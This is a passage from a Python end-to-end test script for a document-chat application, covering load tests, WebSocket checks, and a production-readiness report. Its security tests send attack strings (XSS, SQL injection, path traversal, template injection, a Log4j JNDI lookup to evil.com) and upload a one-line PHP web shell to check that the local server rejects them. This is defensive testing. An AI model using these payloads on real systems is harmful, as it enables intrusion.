            'performance_metrics': {}
        }
        
        # Test 1: API response times under concurrent load
        try:
            print("⚡ Testing API performance under load...")
            
            async with aiohttp.ClientSession() as session:
                # Test concurrent health checks
                concurrent_requests = 20
                start_time = time.time()
                
                tasks = []
                for i in range(concurrent_requests):
                    tasks.append(session.get(f"{self.base_url}/health"))
                
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                end_time = time.time()
                
                successful_responses = sum(1 for r in responses if not isinstance(r, Exception) and r.status == 200)
                total_time = end_time - start_time
                avg_response_time = total_time / concurrent_requests * 1000  # ms
                
                results['performance_metrics']['concurrent_health_checks'] = {
                    'total_requests': concurrent_requests,
                    'successful_requests': successful_responses,
                    'total_time_ms': total_time * 1000,
                    'avg_response_time_ms': avg_response_time,
                    'requests_per_second': concurrent_requests / total_time
                }
                
                if successful_responses >= concurrent_requests * 0.9 and avg_response_time < 1000:
                    results['tests']['concurrent_api_performance'] = True
                    print(f"✅ Concurrent API performance acceptable")
                    print(f"   - Success rate: {successful_responses}/{concurrent_requests}")
                    print(f"   - Avg response time: {avg_response_time:.0f}ms")
                    print(f"   - Requests/sec: {concurrent_requests / total_time:.1f}")
                else:
                    results['tests']['concurrent_api_performance'] = False
                    results['success'] = False
                    print(f"⚠️  Concurrent API performance issues")
                    print(f"   - Success rate: {successful_responses}/{concurrent_requests}")
                    print(f"   - Avg response time: {avg_response_time:.0f}ms")
        
        except Exception as e:
            results['tests']['concurrent_api_performance'] = False
            results['success'] = False
            print(f"❌ Concurrent API performance test error: {e}")
        
        # Test 2: WebSocket connection handling
        try:
            print("🔌 Testing WebSocket connection handling...")
            
            concurrent_connections = 5
            connection_tasks = []
            
            async def test_websocket_connection():
                try:
                    async with websockets.connect(self.websocket_url) as websocket:
                        # Start conversation
                        start_message = {"type": "start_conversation"}
                        await websocket.send(json.dumps(start_message))
                        response = await asyncio.wait_for(websocket.recv(), timeout=10.0)
                        
                        # Send test message
                        chat_message = {"type": "chat_message", "message": "Performance test message"}
                        await websocket.send(json.dumps(chat_message))
                        
                        # Wait for response
                        while True:
                            response = await asyncio.wait_for(websocket.recv(), timeout=15.0)
                            response_data = json.loads(response)
                            if response_data.get('type') == 'response':
                                return True
                        
                except Exception:
                    return False
            
            start_time = time.time()
            for i in range(concurrent_connections):
                connection_tasks.append(test_websocket_connection())
            
            connection_results = await asyncio.gather(*connection_tasks, return_exceptions=True)
            end_time = time.time()
            
            successful_connections = sum(1 for r in connection_results if r is True)
            
            results['performance_metrics']['concurrent_websocket_connections'] = {
                'total_connections': concurrent_connections,
                'successful_connections': successful_connections,
                'total_time_ms': (end_time - start_time) * 1000
            }
            
            if successful_connections >= concurrent_connections * 0.8:  # 80% success
                results['tests']['concurrent_websocket_performance'] = True
                print(f"✅ Concurrent WebSocket performance acceptable")
                print(f"   - Success rate: {successful_connections}/{concurrent_connections}")
            else:
                results['tests']['concurrent_websocket_performance'] = False
                results['success'] = False
                print(f"⚠️  Concurrent WebSocket performance issues")
                print(f"   - Success rate: {successful_connections}/{concurrent_connections}")
        
        except Exception as e:
            results['tests']['concurrent_websocket_performance'] = False
            results['success'] = False
            print(f"❌ Concurrent WebSocket performance test error: {e}")
        
        # Test 3: Memory and resource usage
        try:
            # This is a basic test - in production you'd use more sophisticated monitoring
            import psutil
            import os
            
            process = psutil.Process(os.getpid())
            memory_info = process.memory_info()
            cpu_percent = process.cpu_percent()
            
            results['performance_metrics']['resource_usage'] = {
                'memory_rss_mb': memory_info.rss / 1024 / 1024,
                'memory_vms_mb': memory_info.vms / 1024 / 1024,
                'cpu_percent': cpu_percent
            }
            
            # Basic thresholds (adjust based on your requirements)
            if memory_info.rss < 500 * 1024 * 1024:  # Less than 500MB
                results['tests']['memory_usage'] = True
                print(f"✅ Memory usage acceptable: {memory_info.rss / 1024 / 1024:.1f}MB")
            else:
                results['tests']['memory_usage'] = False
                print(f"⚠️  High memory usage: {memory_info.rss / 1024 / 1024:.1f}MB")
        
        except ImportError:
            results['tests']['memory_usage'] = True  # Skip if psutil not available
            print("⚠️  Memory monitoring not available (psutil not installed)")
        except Exception as e:
            results['tests']['memory_usage'] = False
            print(f"❌ Memory usage test error: {e}")
        
        return results
    
    async def test_security_privacy_controls(self) -> Dict[str, Any]:
        """Test security and privacy controls."""
        
        results = {
            'success': True,
            'tests': {},
            'security_analysis': {}
        }
        
        async with aiohttp.ClientSession() as session:
            
            # Test 1: Input sanitization
            try:
                # Test with potentially malicious input
                malicious_inputs = [
                    "<script>alert('xss')</script>",
                    "'; DROP TABLE documents; --",
                    "../../../etc/passwd",
                    "{{7*7}}",  # Template injection
                    "${jndi:ldap://evil.com/a}"  # Log4j style
                ]
                
                sanitization_working = True
                
                for malicious_input in malicious_inputs:
                    try:
                        async with websockets.connect(self.websocket_url) as websocket:
                            start_message = {"type": "start_conversation"}
                            await websocket.send(json.dumps(start_message))
                            await websocket.recv()
                            
                            chat_message = {
                                "type": "chat_message",
                                "message": malicious_input
                            }
                            await websocket.send(json.dumps(chat_message))
                            
                            # Check if system handles malicious input safely
                            response = await asyncio.wait_for(websocket.recv(), timeout=10.0)
                            response_data = json.loads(response)
                            
                            # System should either reject or sanitize the input
                            if response_data.get('type') in ['error', 'response']:
                                # If it's a response, check that malicious content isn't echoed back
                                if response_data.get('type') == 'response':
                                    response_text = response_data.get('response', {}).get('text_content', '')
                                    if malicious_input in response_text:
                                        sanitization_working = False
                                        print(f"⚠️  Malicious input echoed: {malicious_input[:20]}...")
                            
                    except Exception:
                        # Connection errors are acceptable for malicious input
                        pass
                
                results['tests']['input_sanitization'] = sanitization_working
                if sanitization_working:
                    print("✅ Input sanitization working")
                else:
                    results['success'] = False
                    print("❌ Input sanitization issues detected")
                    
            except Exception as e:
                results['tests']['input_sanitization'] = False
                print(f"❌ Input sanitization test error: {e}")
            
            # Test 2: File upload security
            try:
                # Test various potentially dangerous file types
                dangerous_files = [
                    ('malicious.php', b'<?php system($_GET["cmd"]); ?>', 'application/x-php'),
                    ('script.js', b'console.log("malicious");', 'application/javascript'),
                    ('payload.html', b'<script>alert("xss")</script>', 'text/html')
                ]
                
                upload_security_working = True
                
                for filename, content, content_type in dangerous_files:
                    form_data = aiohttp.FormData()
                    form_data.add_field('file', content, 
                                      filename=filename,
                                      content_type=content_type)
                    form_data.add_field('title', f'Security Test: {filename}')
                    
                    async with session.post(f"{self.base_url}/api/documents/upload", 
                                          data=form_data) as response:
                        if response.status == 200:
                            # System should not accept dangerous file types
                            upload_security_working = False
                            print(f"⚠️  Dangerous file accepted: {filename}")
                        else:
                            # Rejection is expected for security
                            print(f"✅ Dangerous file rejected: {filename}")
                
                results['tests']['file_upload_security'] = upload_security_working
                if not upload_security_working:
                    results['success'] = False
                    
            except Exception as e:
                results['tests']['file_upload_security'] = False
                print(f"❌ File upload security test error: {e}")
            
            # Test 3: Rate limiting (basic test)
            try:
                # Send rapid requests to test rate limiting
                rapid_requests = []
                for i in range(50):  # 50 rapid requests
                    rapid_requests.append(
                        session.get(f"{self.base_url}/health")
                    )
                
                responses = await asyncio.gather(*rapid_requests, return_exceptions=True)
                
                # Check if any requests were rate limited (429 status)
                rate_limited_responses = sum(1 for r in responses 
                                           if not isinstance(r, Exception) and r.status == 429)
                
                if rate_limited_responses > 0:
                    results['tests']['rate_limiting'] = True
                    print(f"✅ Rate limiting active: {rate_limited_responses} requests limited")
                else:
                    results['tests']['rate_limiting'] = False
                    print("⚠️  No rate limiting detected (may not be configured)")
                    
            except Exception as e:
                results['tests']['rate_limiting'] = False
                print(f"❌ Rate limiting test error: {e}")
            
            # Test 4: HTTPS enforcement (if applicable)
            try:
                # Test if HTTP redirects to HTTPS
                if self.base_url.startswith('https://'):
                    http_url = self.base_url.replace('https://', 'http://')
                    async with session.get(http_url, allow_redirects=False) as response:
                        if response.status in [301, 302, 307, 308]:
                            results['tests']['https_enforcement'] = True
                            print("✅ HTTPS enforcement active")
                        else:
                            results['tests']['https_enforcement'] = False
                            print("⚠️  HTTPS enforcement not detected")
                else:
                    results['tests']['https_enforcement'] = True  # Skip for HTTP testing
                    print("⚠️  Testing on HTTP - HTTPS enforcement not applicable")
                    
            except Exception as e:
                results['tests']['https_enforcement'] = True  # Skip on error
                print(f"⚠️  HTTPS enforcement test skipped: {e}")
        
        return results
    
    def generate_comprehensive_report(self) -> str:
        """Generate comprehensive test report for production readiness."""
        
        report = []
        report.append("=" * 80)
        report.append("END-TO-END TEST REPORT - TASK 14.1")
        report.append("Production Readiness Validation")
        report.append("=" * 80)
        report.append("")
        
        # Overall status
        overall_success = self.test_results.get('overall_success', False)
        production_ready = self.test_results.get('production_ready', {}).get('ready_for_production', False)
        
        status_emoji = "🎉" if production_ready else "⚠️"
        report.append(f"{status_emoji} Production Readiness: {'READY' if production_ready else 'NOT READY'}")
        report.append(f"📊 Overall Test Success: {'PASSED' if overall_success else 'FAILED'}")
        report.append("")
        
        # Phase results with success rates
        report.append("📋 Test Phase Results:")
        report.append("-" * 50)
        
        for phase_name, phase_result in self.test_results.items():
            if phase_name in ['overall_success', 'test_timestamp', 'production_ready']:
                continue
                
            if isinstance(phase_result, dict):
                success_rate = self._calculate_phase_success_rate(phase_result)
                status_emoji = "✅" if success_rate >= 0.8 else "❌" if success_rate < 0.5 else "⚠️"
                report.append(f"{status_emoji} {phase_name}: {success_rate:.1%} success rate")
                
                # Add critical test details
                tests = phase_result.get('tests', {})
                failed_tests = [test_name for test_name, result in tests.items() if not result]
                if failed_tests:
                    report.append(f"   Failed tests: {', '.join(failed_tests)}")
        
        report.append("")
        
        # Performance metrics
        report.append("⚡ Performance Analysis:")
        report.append("-" * 30)
        
        for phase_result in self.test_results.values():
            if isinstance(phase_result, dict):
                # Journey metrics
                if 'journey_metrics' in phase_result:
                    metrics = phase_result['journey_metrics']
                    report.append(f"🚀 Complete User Journey:")
                    report.append(f"   - Total time: {metrics.get('total_time', 0):.1f}s")
                    report.append(f"   - Processing time: {metrics.get('processing_time', 0):.1f}s")
                    report.append(f"   - Chat response time: {metrics.get('chat_response_time', 0):.1f}s")
                
                # Performance metrics
                if 'performance_metrics' in phase_result:
                    perf_metrics = phase_result['performance_metrics']
                    if 'concurrent_health_checks' in perf_metrics:
                        concurrent = perf_metrics['concurrent_health_checks']
                        report.append(f"🔄 Concurrent Performance:")
                        report.append(f"   - Requests/sec: {concurrent.get('requests_per_second', 0):.1f}")
                        report.append(f"   - Avg response time: {concurrent.get('avg_response_time_ms', 0):.0f}ms")
                        report.append(f"   - Success rate: {concurrent.get('successful_requests', 0)}/{concurrent.get('total_requests', 0)}")
        
        report.append("")
        
        # RAG Integration Analysis
        for phase_result in self.test_results.values():
            if isinstance(phase_result, dict) and 'rag_analysis' in phase_result:
                rag_analysis = phase_result['rag_analysis']
                report.append("🤖 RAG Integration Analysis:")
                report.append("-" * 35)
                report.append(f"   - Success rate: {rag_analysis.get('success_rate', 0):.1%}")
                report.append(f"   - Successful queries: {rag_analysis.get('successful_queries', 0)}/{rag_analysis.get('total_queries', 0)}")
                report.append("")
                break
        
        # Security Analysis
        security_tests_found = False
        for phase_result in self.test_results.values():
            if isinstance(phase_result, dict) and any('security' in str(k).lower() or 'sanitization' in str(k).lower() 
                                                     for k in phase_result.get('tests', {}).keys()):
                if not security_tests_found:
                    report.append("🔒 Security Analysis:")
                    report.append("-" * 25)
                    security_tests_found = True
                
                tests = phase_result.get('tests', {})
                for test_name, result in tests.items():
                    if 'security' in test_name.lower() or 'sanitization' in test_name.lower():
                        status = "✅" if result else "❌"
                        report.append(f"   {status} {test_name.replace('_', ' ').title()}")
        
        if security_tests_found:
            report.append("")
        
        # Critical Issues
        critical_issues = []
        for phase_name, phase_result in self.test_results.items():
            if isinstance(phase_result, dict):
                success_rate = self._calculate_phase_success_rate(phase_result)
                if success_rate < 0.5:
                    critical_issues.append(f"{phase_name} ({success_rate:.1%} success)")
        
        if critical_issues:
            report.append("🚨 Critical Issues:")
            report.append("-" * 20)
            for issue in critical_issues:
                report.append(f"   ❌ {issue}")
            report.append("")
        
        # Recommendations
        report.append("💡 Recommendations:")
        report.append("-" * 20)
        
        recommended_actions = self.test_results.get('production_ready', {}).get('recommended_actions', [])
        for action in recommended_actions:
            report.append(f"   • {action}")
        
        if not recommended_actions:
            report.append("   ✅ No critical issues found")
        
        report.append("")
        
        # Next Steps
        report.append("🎯 Next Steps:")
        report.append("-" * 15)
        
        if production_ready:
            report.append("   ✅ System is ready for Task 15: Production Readiness Checkpoint")
            report.append("   ✅ Proceed with final production validation")
            report.append("   ✅ Consider implementing Task 14.2: User Acceptance Testing")
        else:
            report.append("   ⚠️  Address critical issues before production deployment")
            report.append("   ⚠️  Re-run end-to-end tests after fixes")
            report.append("   ⚠️  Focus on failed test phases")
        
        report.append("")
        report.append("=" * 80)
        
        return "\n".join(report)


async def main():
    """Main test execution function."""
    
    # Check if server is running
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('localhost', 8000))
    sock.close()
    
    if result != 0:
        print("❌ Server is not running on localhost:8000")
        print("Please start the server with:")
        print("  python -m uvicorn src.multimodal_librarian.main:app --reload")
        return 1
    
    # Run comprehensive end-to-end tests
    tester = EndToEndTester()
    test_results = await tester.run_all_tests()
    
    # Generate and display comprehensive report
    print("\n" + tester.generate_comprehensive_report())
    
    # Save results to file
    results_file = f"end-to-end-test-results-{int(time.time())}.json"
    with open(results_file, 'w') as f:
        json.dump(test_results, f, indent=2, default=str)
    
    print(f"\n📄 Detailed results saved to: {results_file}")
    
    # Return appropriate exit code based on production readiness
    production_ready = test_results.get('production_ready', {}).get('ready_for_production', False)
    return 0 if production_ready else 1


if __name__ == "__main__":
    exit_code = asyncio.run(main())
    sys.exit(exit_code)